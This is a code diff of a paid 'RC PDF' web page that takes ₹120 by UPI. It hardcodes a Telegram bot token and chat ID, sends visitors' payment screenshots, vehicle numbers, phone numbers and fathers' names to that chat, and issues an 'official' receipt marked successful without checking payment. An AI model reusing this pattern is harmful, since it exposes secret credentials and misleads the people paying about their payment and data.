@@ -17,14 +17,7 @@
         }
 
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
-        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; z-index: 1001; }
-        .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
         .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
-
-        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); }
-        .sidebar.active { left: 0; }
-        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; border: 1px solid #ddd; cursor:pointer; text-align: left; }
-        .s-link i { margin-right: 10px; color: var(--ind-blue); }
 
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
 
@@ -43,24 +36,8 @@
         }
         .inner-box { position: relative; background: #fff; border-radius: 11px; padding: 15px; z-index: 1; }
 
-        .neon-btn {
-            position: relative; background: #000; color: #fff; font-size: 20px; font-weight: 900;
-            padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
-        }
-        .neon-btn::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
-            animation: rotateRGB 2s linear infinite;
-        }
-        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
-        
-        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
-        /* Yellow Button Styling */
         .btn-challan { background: #f1c40f; color: #000; margin-top: 15px; border: 2px solid #d4ac0d; }
-        .btn-challan:hover { background: #f39c12; }
 
         .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
         .road { width: 85%; height: 4px; background: #333; position: relative; margin-top: 20px; }
@@ -68,32 +45,13 @@
         .pct { font-size: 45px; font-weight: 900; color: #ff0066; }
         
         .footer { background: #fff; padding: 30px 20px; border-top: 3px solid var(--ind-blue); text-align: center; margin-top: 40px; }
-        .footer-links { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
-        .footer-links span { cursor: pointer; color: #333; font-size: 14px; font-weight: bold; text-decoration: underline; }
-        
-        .wa-float { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: #fff; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; z-index: 3000; text-decoration: none; }
-        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
         <b class="logo">RCPDF.IN</b>
-        <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
-    </div>
-
-    <div class="sidebar" id="side">
-        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'"><i class="fas fa-shield-alt"></i> Insurance Services</button>
-        <button class="s-link" onclick="showPop('About', 'Hum aapko digital RC download karne ki suvidha pradan karte hain.')"><i class="fas fa-info-circle"></i> About Us</button>
-        <button class="s-link" onclick="showPop('T&C', '1. Services sirf information ke liye hai.\n2. Payment non-refundable hai.')"><i class="fas fa-file-contract"></i> Terms & Conditions</button>
-        <button class="s-link" onclick="toggleM()" style="background:#ffdddd; margin-top: 20px;">Close Menu</button>
-    </div>
-
-    <div id="successOverlay" class="overlay">
-        <h1 style="font-size: 40px;">😊</h1>
-        <h1 style="font-size: 30px;">Congratulations!</h1>
-        <p style="font-size: 18px; margin-top: 10px;">Aapka REQUEST bhej diya gaya hai.</p>
+        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
     </div>
 
     <div class="card">
@@ -108,13 +66,12 @@
         </div>
 
         <div id="p2" style="display:none;">
-            <button class="neon-btn" onclick="pay()"></button>
             <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
                 <img id="qr" src="" width="160">
-                <p style="font-size:10px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
+                <p style="font-size:12px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
             </div>
             <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
-            <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
+            <input type="text" id="fatherName" placeholder="Father's Name">
             <div class="neon-box">
                 <div class="inner-box">
                     <input type="file" id="ss" accept="image/*" style="width:100%;">
@@ -125,17 +82,6 @@
         </div>
     </div>
 
-    <div class="footer">
-        <div class="footer-links">
-            <span onclick="showPop('Privacy', 'Aapka data RCPDF.IN par puri tarah surakshit hai. Hum kisi bhi teesre paksh ke sath jankari sajha nahi karte.')">Privacy Policy</span> | 
-            <span onclick="showPop('Terms', 'Ye website sirf education purpose ke liye hai. Kisi bhi galat upyog ki zimmedari user ki hogi.')">Terms & Conditions</span> | 
-            <span onclick="showPop('Refund', 'Ek baar payment safal hone ke baad, koi refund nahi diya jayega.')">Refund Policy</span>
-        </div>
-        <p style="font-size: 13px; color: #666; font-weight: bold;">© 2026 RCPDF.IN | Original Digital Services</p>
-    </div>
-
-    <a href="https://wa.me/918709610091" class="wa-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
-
     <div class="loader-wrap" id="load">
         <div class="road"><div class="car" id="carIcon">🚗</div></div>
         <div class="pct" id="pText">0%</div>
@@ -145,9 +91,6 @@
     <script>
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
-
-        function toggleM() { document.getElementById('side').classList.toggle('active'); }
-        function showPop(title, msg) { alert(title + "\n\n" + msg); }
 
         function formatV(i) {
             let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
@@ -161,48 +104,39 @@
 
         function go2() {
             if(document.getElementById('vehInput').value.length < 9) { alert("Invalid Number!"); return; }
-            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
+            // Changed 'tn' to generic RCPDF SERVICES
+            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RCPDF%20SERVICES";
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
             document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
         }
-
-        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }
 
         async function sendT(f, d, t, tx) {
             let fd = new FormData();
             let fn = document.getElementById('fatherName').value || "N/A";
             fd.append("chat_id", T_CHAT_ID); fd.append("photo", f);
-            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n📅 *Date:* ${d}\n⏰ *Time:* ${t}\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fn}\n💰 *Amt:* ₹120`);
+            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fn}\n💰 *Amt:* ₹120`);
             fd.append("parse_mode", "Markdown");
-            try { await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd }); return true; } catch (e) { return false; }
+            await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd });
         }
 
         function submit() {
             const m = document.getElementById('mob').value;
+            const f = document.getElementById('fatherName').value;
             const s = document.getElementById('ss').files[0];
-            if(m.length < 10 || !s) { alert("Details missing!"); return; }
+            if(m.length < 10 || !s || !f) { alert("Please enter WhatsApp Number, Father's Name and Upload Screenshot!"); return; }
 
             document.getElementById('load').style.display='flex';
             let p = 0;
             let iv = setInterval(async () => {
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
-                let car = document.getElementById('carIcon');
-                car.style.left = (p * 0.85) + "%";
-                if(p === 50) car.innerText = "🏢"; else car.innerText = "🚗";
-
+                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
                 if (p === 60) {
-                    const now = new Date();
                     const txId = "RC" + Math.floor(Math.random() * 9000000000);
-                    await sendT(s, now.toLocaleDateString('en-IN'), now.toLocaleTimeString('en-IN'), txId);
-                    makePDF(now.toLocaleDateString('en-IN'), now.toLocaleTimeString('en-IN'), txId);
+                    await sendT(s, "", "", txId);
+                    makePDF(new Date().toLocaleDateString('en-IN'), new Date().toLocaleTimeString('en-IN'), txId);
                 }
-                if (p >= 100) {
-                    clearInterval(iv);
-                    document.getElementById('load').style.display='none';
-                    document.getElementById('successOverlay').style.display='flex';
-                    setTimeout(() => location.reload(), 4000);
-                }
+                if (p >= 100) { clearInterval(iv); location.reload(); }
             }, 80);
         }
 
@@ -210,23 +144,39 @@
             const { jsPDF } = window.jspdf;
             const doc = new jsPDF();
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
-            doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
-            doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
-            doc.setTextColor(0); doc.setFontSize(12); doc.setDrawColor(200);
+            doc.setTextColor(255); doc.setFontSize(22);
+            doc.text("RCPDF.IN - OFFICIAL RECEIPT", 105, 25, null, null, "center");
+            
+            doc.setTextColor(0); doc.setFontSize(12);
             let y = 50;
-            const data = [["TRANSACTION ID:", tx], ["DATE & TIME:", `${d} | ${t}`], ["VEHICLE NO:", document.getElementById('vehInput').value], ["WHATSAPP NO:", document.getElementById('mob').value], ["AMOUNT PAID:", "INR 120.00"], ["STATUS:", "SUCCESS"]];
+            const data = [
+                ["TRANSACTION ID:", tx], 
+                ["DATE & TIME:", `${d} | ${t}`], 
+                ["VEHICLE NO:", document.getElementById('vehInput').value], 
+                ["FATHER'S NAME:", document.getElementById('fatherName').value],
+                ["WHATSAPP NO:", document.getElementById('mob').value], 
+                ["AMOUNT PAID:", "INR 120.00"], 
+                ["STATUS:", "SUCCESSFUL"]
+            ];
             data.forEach(item => { doc.rect(15, y, 180, 10); doc.text(item[0], 20, y + 7); doc.text(item[1], 85, y + 7); y += 10; });
-            doc.rect(15, y + 5, 180, 45); doc.text("SUPPORT QR CODE", 25, y + 15);
-            doc.addImage(document.getElementById('qr').src, 'PNG', 150, y + 10, 35, 35);
-            y += 65; doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
-            doc.setFontSize(10); doc.text(["1. Digital Services Only.", "2. Non-Refundable Payment.", "3. Delivery on WhatsApp (30-60m)."], 15, y + 8);
-            
-            // THANK YOU SECTION
-            doc.setFontSize(20);
-            doc.setFont("times", "italic");
-            doc.text("THANK YOU", 105, 270, null, null, "center");
-            
-            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
+
+            y += 10;
+            doc.setFontSize(14); doc.setFont("helvetica", "bold");
+            doc.text("TERMS AND CONDITIONS", 15, y);
+            doc.setFontSize(9); doc.setFont("helvetica", "normal");
+            const terms = [
+                "1. This is a digital processing receipt. The final RC PDF will be sent to your WhatsApp.",
+                "2. This website is private and NOT affiliated with mParivahan or any RTO department.",
+                "3. Paid amount is strictly non-refundable once the request is initiated.",
+                "4. Responsibility for correct Vehicle/Chassis details lies solely with the user.",
+                "5. In case of delay, please contact support with your Transaction ID.",
+                "6. This document is for information purposes and not a legal substitute for an original RC."
+            ];
+            doc.text(terms, 15, y + 8);
+
+            doc.setFont("times", "italic"); doc.setFontSize(50); doc.setTextColor(0, 51, 153);
+            doc.text("Thank You", 105, 275, null, null, "center");
+            doc.setDrawColor(0, 51, 153); doc.setLineWidth(1); doc.rect(5, 5, 200, 287);
             doc.save(`Receipt_${tx}.pdf`);
         }
     </script>
